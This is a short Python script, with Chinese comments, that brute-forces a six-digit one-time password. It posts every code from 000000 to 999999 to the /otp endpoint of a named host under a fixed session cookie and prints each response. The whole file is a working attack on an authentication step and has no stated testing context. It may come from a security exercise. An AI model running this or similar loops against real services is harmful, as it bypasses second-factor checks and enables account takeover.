import api

# 设置cookies id = 2
baseURL = "https://hcvs.gtvps.com/"

# 暴力破解OTP测试，从000000到999999
for i in range(1000000):
    # 发送请求
    res = api.send_request("post", baseURL + "otp", cookies={"id": "2"}, data={"otp": str(i).zfill(6)})
    # 判断是否成功

    print(res)
    # exit()

